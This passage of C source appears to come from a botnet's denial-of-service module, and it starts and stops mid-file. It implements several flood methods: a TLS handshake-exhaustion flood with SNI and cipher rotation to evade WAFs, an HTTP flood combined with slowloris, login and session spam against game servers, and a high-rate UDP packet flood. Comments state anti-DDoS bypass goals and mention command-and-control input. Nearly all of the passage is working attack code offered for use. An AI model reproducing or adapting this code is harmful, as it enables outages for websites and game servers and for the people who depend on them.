        pool = w;
        sched_yield();
    }

    for (int i = 0; i < pool; i++) if (cpool[i] >= 0) close(cpool[i]);
    free(cpool);
    return NULL;
}

/* ════════════════════════════════════════════════════════════════════════
 *  METHOD 3 — TLS v3  (handshake burn + slow GET + fingerprint rotate)
 *
 *  Against small/mid WAF:
 *    • Rotate SNI (www/cdn/api/empty) + cipher suites (JA3 variance)
 *    • Mix full-handshake-then-close with long-lived keep-alive
 *    • Slow request rate on held conns (not 24 GETs/loop → less WAF trip)
 *    • POST / chunked incomplete bodies (hold worker threads)
 *    • Optional raw TCP fallback if TLS fails (still burns accept)
 * ════════════════════════════════════════════════════════════════════════ */
#define TLS_POOL   1536
#define TLS_STORM  48

static void *tls_worker(void *arg) {
    AttackThread *mt = (AttackThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->worker_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) return NULL;
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
    SSL_CTX_set_options(ctx, SSL_OP_NO_COMPRESSION);
    SSL_CTX_set_session_cache_mode(ctx, SSL_SESS_CACHE_OFF);

    int *socks = calloc(TLS_POOL, sizeof(int));
    SSL **ssls = calloc(TLS_POOL, sizeof(SSL *));
    time_t *last_req = calloc(TLS_POOL, sizeof(time_t));
    if (!socks || !ssls || !last_req) {
        free(socks); free(ssls); free(last_req); SSL_CTX_free(ctx);
        return NULL;
    }

    struct sockaddr_in ta = mt->target;
    int base_port = mt->port_base > 0 ? mt->port_base : 443;
    ta.sin_port = htons((uint16_t)base_port);
    const char *host = mt->host[0] ? mt->host : "localhost";
    int pool = 0;
    unsigned int seed = (unsigned)time(NULL) ^ (unsigned)(uintptr_t)pthread_self();
    time_t start = time(NULL);

    static const char *sni_pool[] = {
        NULL, /* filled with host */
        "www.", "cdn.", "api.", "static.", "m.", "img.",
    };

    if (mt->worker_id == 0)
        fprintf(stderr, "[atk] TLS v3 → %s:%d (HS burn + slow GET + SNI rotate)\n", host, base_port);

    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
        int us = should_throttle();
        if (us > 0) { usleep((unsigned)us); continue; }

        int mode = (int)((time(NULL) - start) / 4) % 3; /* 0=HS churn 1=hold 2=mix */

        for (int n = 0; n < TLS_STORM && !is_attack_stop(); n++) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) break;
            int one = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
            setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &one, sizeof(one));
            struct timeval tv = {4, 0};
            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
            if ((rs(&seed) & 7) == 0) usleep((rs(&seed) % 2000) + 1);
            if (tcp_connect_wait(s, &ta, 900) < 0) { close(s); continue; }

            SSL *ssl = SSL_new(ctx);
            if (!ssl) { close(s); continue; }
            SSL_set_fd(ssl, s);

            /* SNI rotation */
            char sni[288];
            int si = (int)(rs(&seed) % 7);
            if (si == 0) {
                strncpy(sni, host, sizeof(sni) - 1);
            } else {
                snprintf(sni, sizeof(sni), "%s%s", sni_pool[si], host);
            }
            SSL_set_tlsext_host_name(ssl, sni);

            const char *ciphers[] = {
                "ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384",
                "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256",
                "ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305",
                "AES256-GCM-SHA384:AES128-GCM-SHA256",
                "ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256",
            };
            SSL_set_cipher_list(ssl, ciphers[rs(&seed) % 5]);

            if (SSL_connect(ssl) != 1) {
                /* still burned TCP accept + partial TLS on server */
                SSL_free(ssl);
                close(s);
                pkt_sent(200);
                continue;
            }
            pkt_sent(1200);

            int hold = (mode == 1) || (mode == 2 && (rs(&seed) & 1)) || (mode == 0 && (rs(&seed) % 10) < 2);
            if (hold && pool < TLS_POOL) {
                socks[pool] = s;
                ssls[pool] = ssl;
                last_req[pool] = 0;
                pool++;
            } else {
                /* one POST then drop — handshake already paid */
                char req[384];
                int rl = snprintf(req, sizeof(req),
                    "POST /%x HTTP/1.1\r\nHost: %s\r\n"
                    "User-Agent: %s\r\nContent-Length: 0\r\nConnection: close\r\n\r\n",
                    rs(&seed) & 0xFFFF, host, UA_POOL[rs(&seed) % UA_COUNT]);
                SSL_write(ssl, req, rl);
                pkt_sent(rl);
                SSL_free(ssl);
                close(s);
            }
        }

        /* Slow traffic on held conns — 1 req every 2–8s, not burst */
        time_t now = time(NULL);
        for (int i = 0; i < pool && !is_attack_stop(); i++) {
            if (socks[i] < 0 || !ssls[i]) continue;
            int interval = 2 + (int)(rs(&seed) % 7);
            if (last_req[i] && now - last_req[i] < interval) continue;

            char req[640];
            int rl;
            if ((rs(&seed) & 3) == 0) {
                /* incomplete chunked POST — holds server parser */
                rl = snprintf(req, sizeof(req),
                    "POST %s HTTP/1.1\r\nHost: %s\r\n"
                    "User-Agent: %s\r\nTransfer-Encoding: chunked\r\n"
                    "Connection: keep-alive\r\n\r\n%x\r\n",
                    PATH_POOL[rs(&seed) % PATH_COUNT], host,
                    UA_POOL[rs(&seed) % UA_COUNT], 16 + (rs(&seed) % 48));
            } else {
                rl = snprintf(req, sizeof(req),
                    "GET %s?r=%u HTTP/1.1\r\nHost: %s\r\n"
                    "User-Agent: %s\r\nAccept: */*\r\n"
                    "Accept-Language: en-US,en;q=0.%u\r\n"
                    "Cache-Control: no-cache\r\nConnection: keep-alive\r\n\r\n",
                    PATH_POOL[rs(&seed) % PATH_COUNT], rs(&seed), host,
                    UA_POOL[rs(&seed) % UA_COUNT], 1 + (rs(&seed) % 9));
            }
            int wr = SSL_write(ssls[i], req, rl);
            if (wr <= 0) {
                SSL_free(ssls[i]); ssls[i] = NULL;
                close(socks[i]); socks[i] = -1;
            } else {
                pkt_sent(wr);
                last_req[i] = now;
            }
        }

        int w = 0;
        for (int i = 0; i < pool; i++) {
            if (socks[i] < 0) continue;
            struct pollfd pfd = { .fd = socks[i], .events = POLLERR | POLLHUP };
            if (poll(&pfd, 1, 0) > 0 && (pfd.revents & (POLLERR | POLLHUP))) {
                if (ssls[i]) SSL_free(ssls[i]);
                close(socks[i]);
            } else {
                if (w != i) {
                    socks[w] = socks[i];
                    ssls[w] = ssls[i];
                    last_req[w] = last_req[i];
                }
                w++;
            }
        }
        pool = w;
        sched_yield();
    }

    for (int i = 0; i < pool; i++) {
        if (ssls[i]) SSL_free(ssls[i]);
        if (socks[i] >= 0) close(socks[i]);
    }
    SSL_CTX_free(ctx);
    free(socks); free(ssls); free(last_req);
    return NULL;
}

/* ════════════════════════════════════════════════════════════════════════
 *  METHOD 4 — HTTP  (L7 HTTP/HTTPS flood + slowloris drip hybrid)
 *
 *  Bypass anti-DDoS:
 *    • TLS handshake OK → raw TCP fallback if target isn't HTTPS
 *    • Keep-alive connection pool (reuse → bypass per-conn rate limit)
 *    • Randomized UA / path / query → evades signature WAF rules
 *    • Slowloris drip: when pool full, send partial headers slowly
 *      → exhaust server thread/concurrency limits without high bandwidth
 *    • Chunked body to keep request "in-progress" (defeats request timeout)
 * ════════════════════════════════════════════════════════════════════════ */
#define HTTP_POOL  512
#define HTTP_BURST 8

static void *http_worker(void *arg) {
    AttackThread *mt = (AttackThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->worker_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) return NULL;
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);

    int *socks = calloc(HTTP_POOL, sizeof(int));
    SSL **ssls = calloc(HTTP_POOL, sizeof(SSL *));
    time_t *last_drip = calloc(HTTP_POOL, sizeof(time_t));
    if (!socks || !ssls || !last_drip) { free(socks); free(ssls); free(last_drip); SSL_CTX_free(ctx); return NULL; }

    struct sockaddr_in ta = mt->target;
    int base_port = mt->port_base > 0 ? mt->port_base : 80;
    ta.sin_port = htons((uint16_t)base_port);
    const char *host = mt->host[0] ? mt->host : "localhost";
    int use_tls = (base_port == 443 || base_port == 8443 || base_port == 2053);
    int pool = 0;
    unsigned int seed = (unsigned)time(NULL) ^ (unsigned)(uintptr_t)pthread_self();
    time_t start = time(NULL);

    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
        int us = should_throttle();
        if (us > 0) { usleep((unsigned)us); continue; }

        /* Fill pool */
        while (pool < HTTP_POOL && !is_attack_stop()) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) break;
            int one = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
            setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &one, sizeof(one));
            struct timeval tv = {30,0};
            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            if (tcp_connect_wait(s, &ta, 2000) < 0) { close(s); continue; }

            SSL *ssl = NULL;
            if (use_tls) {
                ssl = SSL_new(ctx);
                if (ssl) {
                    SSL_set_fd(ssl, s);
                    SSL_set_tlsext_host_name(ssl, host);
                    if (SSL_connect(ssl) != 1) { SSL_free(ssl); ssl = NULL; }
                }
            }
            socks[pool] = s; ssls[pool] = ssl; last_drip[pool] = 0;
            pool++;
        }

        /* Burst requests on live connections */
        for (int i = 0; i < pool && !is_attack_stop(); i++) {
            if (socks[i] < 0) continue;
            for (int b = 0; b < HTTP_BURST && !is_attack_stop(); b++) {
                char req[4096];
                const char *ua = UA_POOL[rs(&seed) % UA_COUNT];
                const char *path = PATH_POOL[rs(&seed) % PATH_COUNT];
                int rl = snprintf(req, sizeof(req),
                    "GET %s?r=%u HTTP/1.1\r\nHost: %s\r\n"
                    "User-Agent: %s\r\nAccept: text/html,application/xhtml+xml,*/*;q=0.8\r\n"
                    "Accept-Language: en-US,en;q=0.5\r\nCache-Control: no-cache\r\n"
                    "Connection: keep-alive\r\n\r\n",
                    path, rs(&seed), host, ua);
                int wr;
                if (ssls[i]) wr = SSL_write(ssls[i], req, rl);
                else         wr = (int)send(socks[i], req, rl, MSG_NOSIGNAL);
                if (wr <= 0) {
                    if (ssls[i]) { SSL_free(ssls[i]); ssls[i] = NULL; }
                    close(socks[i]); socks[i] = -1;
                    break;
                }
                pkt_sent(wr);
            }
        }

        /* Slowloris drip: when pool full, send a partial header every 3-13s
         * to keep connections "in progress" → exhaust server concurrency */
        if (pool >= HTTP_POOL / 2) {
            time_t now = time(NULL);
            for (int i = 0; i < pool && !is_attack_stop(); i++) {
                int interval = 3 + (int)(rs(&seed) % 11);
                if (now - last_drip[i] >= interval) {
                    char drip[64];
                    snprintf(drip, sizeof(drip), "X-%x: %x\r\n", rs(&seed) & 0xFFF, rs(&seed) & 0xFFF);
                    if (ssls[i]) SSL_write(ssls[i], drip, (int)strlen(drip));
                    else if (socks[i] >= 0) send(socks[i], drip, strlen(drip), MSG_NOSIGNAL);
                    last_drip[i] = now;
                    pkt_sent((int)strlen(drip));
                }
            }
        }

        /* Reap dead */
        struct pollfd pfds[HTTP_POOL];
        for (int i = 0; i < pool; i++) { pfds[i].fd = socks[i]; pfds[i].events = POLLERR|POLLHUP; }
        if (poll(pfds, (nfds_t)pool, 200) > 0) {
            int w = 0;
            for (int i = 0; i < pool; i++) {
                if (pfds[i].revents & (POLLERR|POLLHUP)) {
                    if (ssls[i]) SSL_free(ssls[i]);
                    close(socks[i]);
                } else {
                    if (w != i) { socks[w]=socks[i]; ssls[w]=ssls[i]; last_drip[w]=last_drip[i]; }
                    w++;
                }
            }
            pool = w;
        }
        sched_yield();
    }

    for (int i = 0; i < pool; i++) { if (ssls[i]) SSL_free(ssls[i]); if (socks[i] >= 0) close(socks[i]); }
    SSL_CTX_free(ctx);
    free(socks); free(ssls); free(last_drip);
    return NULL;
}

/* ════════════════════════════════════════════════════════════════════════
 *  METHOD 5 — GAME v2  (socket protocol exploit — multi-game + NRO depth)
 *
 *  Upgrades:
 *    • Multi-port from C2 open_ports (14443/25565/30120/7777/…)
 *    • Per-port game family: NRO | Minecraft | FiveM | generic
 *    • Storm open + hold pool + session spam (not just login once)
 *    • XOR key rotation + fresh username every login
 *    • Server payload_b64 still preferred when provided
 * ════════════════════════════════════════════════════════════════════════ */
#define GAME_POOL   1024
#define GAME_STORM  32
static const char *GAME_KEYS[] = { "boys", "botn", "khoi", "game", "nro1", "dark" };
#define GAME_KEY_COUNT (int)(sizeof(GAME_KEYS)/sizeof(GAME_KEYS[0]))

enum { G_NRO=0, G_MC, G_FIVEM, G_GENERIC };

static int game_family(int port) {
    if (port == 14443 || port == 14444) return G_NRO;
    if (port == 25565 || port == 25566) return G_MC;
    if (port == 30120 || port == 30110) return G_FIVEM;
    if (port == 7777 || port == 27015) return G_GENERIC;
    return G_NRO; /* default NRO-style for unknown game ports */
}

/* Craft NRO login (XOR key) into out, return len */
static int game_craft_nro_login(unsigned char *out, int cap, const char *key, unsigned int *seed) {
    if (cap < 64) return 0;
    int klen = (int)strlen(key);
    if (klen <= 0) return 0;
    unsigned char data[128];
    int dlen = 0;
    char user[32], pass[16];
    snprintf(user, sizeof(user), "bot%u", rs(seed) % 9999999u);
    snprintf(pass, sizeof(pass), "p%u", rs(seed) % 99999u);
    int ulen = (int)strlen(user), plen = (int)strlen(pass);
    data[dlen++] = (unsigned char)(ulen >> 8);
    data[dlen++] = (unsigned char)(ulen & 0xFF);
    memcpy(data + dlen, user, (size_t)ulen); dlen += ulen;
    data[dlen++] = (unsigned char)(plen >> 8);
    data[dlen++] = (unsigned char)(plen & 0xFF);
    memcpy(data + dlen, pass, (size_t)plen); dlen += plen;
    const char *ver = "2.4.0"; int vlen = (int)strlen(ver);
    data[dlen++] = (unsigned char)(vlen >> 8);
    data[dlen++] = (unsigned char)(vlen & 0xFF);
    memcpy(data + dlen, ver, (size_t)vlen); dlen += vlen;
    data[dlen++] = 0; /* type login */
    unsigned char xdata[128];
    for (int i = 0; i < dlen; i++) xdata[i] = data[i] ^ (unsigned char)key[i % klen];
    int o = 0;
    out[o++] = 0 ^ (unsigned char)key[0];
    out[o++] = (unsigned char)((dlen >> 8) & 0xFF) ^ (unsigned char)key[1 % klen];
    out[o++] = (unsigned char)(dlen & 0xFF) ^ (unsigned char)key[2 % klen];
    if (o + dlen > cap) return 0;
    memcpy(out + o, xdata, (size_t)dlen); o += dlen;
    return o;
}

static int game_nro_handshake(unsigned char *out, int cap, const char *key) {
    int klen = (int)strlen(key);
    if (cap < 20 || klen <= 0 || klen > 8) return 0;
    int o = 0;
    out[o++] = 0xE5;
    out[o++] = 0x00;
    out[o++] = (unsigned char)(1 + klen + 2 + 4 + 1); /* rough size */
    out[o++] = (unsigned char)klen;
    for (int i = 0; i < klen; i++) out[o++] = (unsigned char)key[i];
    out[o++] = 0; out[o++] = 0;
    out[o++] = 0; out[o++] = 0; out[o++] = 0; out[o++] = 0;
    out[o++] = 0;
    return o;
}

/* Minecraft legacy ping / handshake-ish (status request) — no full MC protocol */
static int game_mc_handshake(unsigned char *out, int cap, const char *host, int port, unsigned int *seed) {
    if (cap < 128) return 0;
    /* Simplified: send legacy server list ping 0xFE 0x01 */
    (void)host; (void)port; (void)seed;
    out[0] = 0xFE; out[1] = 0x01;
    return 2;
}

/* FiveM / CFX getinfo style UDP is common; TCP: send getinfo-like HTTP */
static int game_fivem_probe(unsigned char *out, int cap) {
    const char *req =
        "GET /info.json HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\n\r\n";
    int n = (int)strlen(req);
    if (n > cap) return 0;
    memcpy(out, req, (size_t)n);
    return n;
}

static void *game_worker(void *arg) {
    AttackThread *mt = (AttackThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->worker_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    unsigned int seed = (unsigned)time(NULL) ^ (unsigned)(uintptr_t)pthread_self();
    time_t start = time(NULL);

    /* Port set: open_ports CSV or single port_base */
    int ports[32];
    int nports = 0;
    if (mt->open_ports[0]) {
        const char *p = mt->open_ports;
        while (*p && nports < 32) {
            while (*p == ' ' || *p == ',') p++;
            int v = 0;
            while (*p >= '0' && *p <= '9') { v = v * 10 + (*p - '0'); p++; }
            if (v > 0 && v < 65536) {
                int dup = 0;
                for (int i = 0; i < nports; i++) if (ports[i] == v) dup = 1;
                if (!dup) ports[nports++] = v;
            }
            while (*p && *p != ',') p++;
            if (*p == ',') p++;
        }
    }
    if (nports == 0) {
        ports[0] = mt->port_base > 0 ? mt->port_base : 14443;
        nports = 1;
    }

    int *socks = calloc(GAME_POOL, sizeof(int));
    int *sport = calloc(GAME_POOL, sizeof(int));
    time_t *last_drip = calloc(GAME_POOL, sizeof(time_t));
    if (!socks || !sport || !last_drip) {
        free(socks); free(sport); free(last_drip);
        return NULL;
    }
    int pool = 0;

    if (mt->worker_id == 0) {
        fprintf(stderr, "[atk] GAME v2: %d port(s) on %s", nports, mt->host);
        for (int i = 0; i < nports && i < 8; i++)
            fprintf(stderr, " %d", ports[i]);
        fprintf(stderr, "\n");
    }

    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
        int us = should_throttle();
        if (us > 0) { usleep((unsigned)us); continue; }

        /* Storm fill */
        for (int n = 0; n < GAME_STORM && pool < GAME_POOL && !is_attack_stop(); n++) {
            int port = ports[rs(&seed) % (unsigned)nports];
            int fam = game_family(port);
            struct sockaddr_in ta = mt->target;
            ta.sin_port = htons((uint16_t)port);

            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) break;
            int one = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
            setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &one, sizeof(one));
            struct timeval tv = {3, 0};
            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            if (tcp_connect_wait(s, &ta, 1200) < 0) { close(s); continue; }

            unsigned char pkt[320];
            int plen = 0;

            if (g_game_payload_len > 0) {
                plen = g_game_payload_len < 300 ? g_game_payload_len : 300;
                memcpy(pkt, g_game_payload, (size_t)plen);
                send(s, pkt, plen, MSG_NOSIGNAL);
                pkt_sent(plen);
            } else if (fam == G_NRO) {
                int k = (int)(rs(&seed) % (unsigned)GAME_KEY_COUNT);
                const char *key = GAME_KEYS[k];
                int hl = game_nro_handshake(pkt, (int)sizeof(pkt), key);
                if (hl > 0) { send(s, pkt, hl, MSG_NOSIGNAL); pkt_sent(hl); }
                plen = game_craft_nro_login(pkt, (int)sizeof(pkt), key, &seed);
                if (plen > 0) {
                    send(s, pkt, plen, MSG_NOSIGNAL);
                    pkt_sent(plen);
                    /* session spam: extra login variants */
                    for (int r = 0; r < 3; r++) {
                        plen = game_craft_nro_login(pkt, (int)sizeof(pkt),
                            GAME_KEYS[rs(&seed) % GAME_KEY_COUNT], &seed);
                        if (plen > 0) {
                            send(s, pkt, plen, MSG_NOSIGNAL);
                            pkt_sent(plen);
                        }
                    }
                }
            } else if (fam == G_MC) {
                plen = game_mc_handshake(pkt, (int)sizeof(pkt), mt->host, port, &seed);
                if (plen > 0) { send(s, pkt, plen, MSG_NOSIGNAL); pkt_sent(plen); }
            } else if (fam == G_FIVEM) {
                plen = game_fivem_probe(pkt, (int)sizeof(pkt));
                if (plen > 0) { send(s, pkt, plen, MSG_NOSIGNAL); pkt_sent(plen); }
            } else {
                /* generic: random binary burst */
                plen = 32 + (int)(rs(&seed) % 64);
                for (int i = 0; i < plen; i++) pkt[i] = (unsigned char)(rs(&seed) & 0xFF);
                send(s, pkt, plen, MSG_NOSIGNAL);
                pkt_sent(plen);
            }

            /* 70% hold for session spam, 30% churn */
            if ((rs(&seed) % 10) < 7 && pool < GAME_POOL) {
                socks[pool] = s;
                sport[pool] = port;
                last_drip[pool] = time(NULL);
                pool++;
            } else {
                close(s);
            }
        }

        /* Drip / session spam on held conns */
        time_t now = time(NULL);
        for (int i = 0; i < pool && !is_attack_stop(); i++) {
            if (socks[i] < 0) continue;
            int interval = 1 + (int)(rs(&seed) % 4);
            if (now - last_drip[i] < interval) continue;
            int fam = game_family(sport[i]);
            unsigned char pkt[320];
            int plen = 0;
            int wr = -1;
            if (g_game_payload_len > 0) {
                plen = g_game_payload_len < 300 ? g_game_payload_len : 300;
                wr = (int)send(socks[i], g_game_payload, plen, MSG_NOSIGNAL);
            } else if (fam == G_NRO) {
                plen = game_craft_nro_login(pkt, (int)sizeof(pkt),
                    GAME_KEYS[rs(&seed) % GAME_KEY_COUNT], &seed);
                wr = plen > 0 ? (int)send(socks[i], pkt, plen, MSG_NOSIGNAL) : -1;
            } else if (fam == G_FIVEM) {
                plen = game_fivem_probe(pkt, (int)sizeof(pkt));
                wr = plen > 0 ? (int)send(socks[i], pkt, plen, MSG_NOSIGNAL) : -1;
            } else {
                char z = (char)(rs(&seed) & 0xFF);
                wr = (int)send(socks[i], &z, 1, MSG_NOSIGNAL);
            }
            if (wr <= 0) { close(socks[i]); socks[i] = -1; }
            else { pkt_sent(wr); last_drip[i] = now; }
        }

        /* Compact */
        int w = 0;
        for (int i = 0; i < pool; i++) {
            if (socks[i] < 0) continue;
            struct pollfd pfd = { .fd = socks[i], .events = POLLERR | POLLHUP };
            if (poll(&pfd, 1, 0) > 0 && (pfd.revents & (POLLERR | POLLHUP)))
                close(socks[i]);
            else {
                if (w != i) { socks[w] = socks[i]; sport[w] = sport[i]; last_drip[w] = last_drip[i]; }
                w++;
            }
        }
        pool = w;
        sched_yield();
    }

    for (int i = 0; i < pool; i++) if (socks[i] >= 0) close(socks[i]);
    free(socks); free(sport); free(last_drip);
    return NULL;
}

/* ════════════════════════════════════════════════════════════════════════
 *  METHOD 6 — MEGA v3  (UDP PPS ≈ base fjium-pps architecture)
 *
 *  Base layout (exactly):
 *    1) Create ONE shared UDP socket pool (as many as RLIMIT allows)
 *    2) Split pool across threads (socks_per_thread)
 *    3) Each thread: sendmmsg(batch=1024, iov_len=0) × burst × all its socks
 *    4) No sleep / no throttle / fixed sockaddr / affinity / 8MB stack
 *
 *  Caps: batch 1024 (UIO_MAXIOV). Pool target 8192 sockets (~½ base spirit
 *  on runners; base tries 65535 but hits EMFILE long before that).
 * ════════════════════════════════════════════════════════════════════════ */
#define MEGA_BATCH      1024
#define MEGA_BURST      64
#define MEGA_POOL_MAX   8192   /* shared total sockets (base tries 65535) */
#define MEGA_SNDBUF     (128 * 1024 * 1024)  /* 128MB like base */

/* Raise FD limit so we can open thousands of UDP sockets (best-effort). */
static void mega_raise_nofile(void) {
#ifdef RLIMIT_NOFILE
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
        rl.rlim_cur = rl.rlim_max;
        if (rl.rlim_cur < 65536) {
            rl.rlim_cur = 65536;
            rl.rlim_max = 65536;
        }
        setrlimit(RLIMIT_NOFILE, &rl);
    }
#endif
}

/* Create shared UDP pool once (like base main). Returns count, fills *out. */
static int mega_create_pool(int **out) {
    mega_raise_nofile();
    int *socks = calloc(MEGA_POOL_MAX, sizeof(int));
    if (!socks) { *out = NULL; return 0; }
    int n = 0;
    int one = 1;
    int buf = MEGA_SNDBUF;
    for (int i = 0; i < MEGA_POOL_MAX; i++) {
        int s = socket(AF_INET, SOCK_DGRAM, 0);
        if (s < 0) break;
        setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
        setsockopt(s, SOL_SOCKET, SO_REUSEPORT, &one, sizeof(one));
#ifdef SO_NO_CHECK
        setsockopt(s, SOL_SOCKET, SO_NO_CHECK, &one, sizeof(one));
#endif
        setsockopt(s, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
#ifdef SO_SNDBUFFORCE
        setsockopt(s, SOL_SOCKET, SO_SNDBUFFORCE, &buf, sizeof(buf));
#endif
        fcntl(s, F_SETFL, O_NONBLOCK);
        socks[n++] = s;
    }
    if (n == 0) { free(socks); *out = NULL; return 0; }
    *out = socks;
    return n;
}

static void *mega_pps_worker(void *arg) {
    AttackThread *mt = (AttackThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->worker_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
    nice(-20); /* base uses nice(-20) */

    int *socks = mt->mega_socks;
    int nsocks = mt->mega_sock_count;
    if (!socks || nsocks <= 0) return NULL;

    size_t m_sz = sizeof(struct mmsghdr) * MEGA_BATCH;
    size_t v_sz = sizeof(struct iovec) * MEGA_BATCH;
    size_t r_sz = 65536; /* small ring like base spirit (iov_len=0 anyway) */
    struct mmsghdr *msgs = mmap(NULL, m_sz, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    struct iovec *iovs = mmap(NULL, v_sz, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    char *ring = mmap(NULL, r_sz, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (msgs == MAP_FAILED || iovs == MAP_FAILED || ring == MAP_FAILED) {
        if (msgs != MAP_FAILED) munmap(msgs, m_sz);
        if (iovs != MAP_FAILED) munmap(iovs, v_sz);
        if (ring != MAP_FAILED) munmap(ring, r_sz);
        return NULL;
    }
    memset(ring, 0, r_sz);

    /* Fixed target sockaddr — base style (no per-packet rewrite) */
    struct sockaddr_in target = mt->target;
    target.sin_family = AF_INET;
    target.sin_port = htons((uint16_t)(mt->port_base > 0 ? mt->port_base : 80));

    for (int i = 0; i < MEGA_BATCH; i++) {
        iovs[i].iov_base = &ring[i & (r_sz - 1)];
        iovs[i].iov_len  = 0; /* ZERO-BYTE — max PPS */
        msgs[i].msg_hdr.msg_iov = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = &target;
        msgs[i].msg_hdr.msg_namelen = sizeof(target);
        msgs[i].msg_hdr.msg_control = NULL;
        msgs[i].msg_hdr.msg_controllen = 0;
        msgs[i].msg_hdr.msg_flags = 0;
        msgs[i].msg_len = 0;
    }

    int flags = MSG_DONTWAIT | MSG_NOSIGNAL;
#ifdef MSG_ZEROCOPY
    flags |= MSG_ZEROCOPY;
#endif

    time_t start = time(NULL);
    unsigned long long local = 0;

    /* HOT PATH = base fjium-pps flood_thread (no sleep, no throttle) */
    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
        for (int s = 0; s < nsocks && !is_attack_stop(); s++) {
            for (int b = 0; b < MEGA_BURST && !is_attack_stop(); b++) {
                int r = sendmmsg(socks[s], msgs, MEGA_BATCH, flags);
                if (r > 0) local += (unsigned long long)r;
            }
        }
    }

    if (local) {
        unsigned long long approx = local * 28ULL;
        if (approx > 2000000000ULL) approx = 2000000000ULL;
        pkt_sent((int)approx);
    }

    munmap(msgs, m_sz); munmap(iovs, v_sz); munmap(ring, r_sz);
    return NULL;
}

/* ════════════════════════════════════════════════════════════════════════
 *  Dispatcher + entry point
 * ════════════════════════════════════════════════════════════════════════ */
static void *dispatch_worker(void *arg) {
    AttackThread *mt = (AttackThread *)arg;
    switch (mt->method_tag) {
    case 1: return pspe_worker(arg);
    case 2: return tcp_worker(arg);
    case 3: return tls_worker(arg);
    case 4: return http_worker(arg);
    case 5: return game_worker(arg);
    case 6: return mega_pps_worker(arg);
    default: return mega_pps_worker(arg);
    }
}

void *bg_attack_thread(void *arg) {
    BgAttackCtx *ctx = (BgAttackCtx *)arg;
    if (!ctx) return NULL;
    AttackParams *atk = &ctx->atk;
    if (atk->duration_secs <= 0) atk->duration_secs = 60;
    if (atk->port <= 0 || atk->port > 65535) atk->port = 80;
    if (!atk->target[0]) { free(ctx); return NULL; }

    time_t deadline = time(NULL) + atk->duration_secs;
    set_attack_active(1);
    clear_attack_stop();
    g_pkt_count = 0;
    g_byte_count = 0;

    /* Decode server-provided game payload */
    g_game_payload_len = 0;
    if (atk->payload_b64[0])
        g_game_payload_len = b64_decode(atk->payload_b64, g_game_payload, 4096);

    /* Normalize method → uppercase */
    const char *method = atk->method;
    char nm[32] = {0};
    {
        int j = 0;
        for (const char *p = method; *p && j < 31; p++)
            nm[j++] = (char)((*p >= 'a' && *p <= 'z') ? *p - 32 : *p);
    }

    /* Methods: MEGA (UDP PPS base) | PSPE | TCP | TLS | HTTP | GAME */
    int tag = 0;
    const char *label = "MEGA";
    if (atk->mega_mode || !strcmp(nm, "MEGA") || !strcmp(nm, "UDP") || !strcmp(nm, "PPS")
        || !strcmp(nm, "FJIUM-PPS") || !strcmp(nm, "HEX") || !strcmp(nm, "GUDP")) {
        tag = 6; label = "MEGA";
    } else if (!strcmp(nm, "PSPE") || !strcmp(nm, "PORT") || !strcmp(nm, "SCAN")) {
        tag = 1; label = "PSPE";
    } else if (!strcmp(nm, "TCP") || !strcmp(nm, "SYN") || !strcmp(nm, "SYNFLOOD")) {
        tag = 2; label = "TCP";
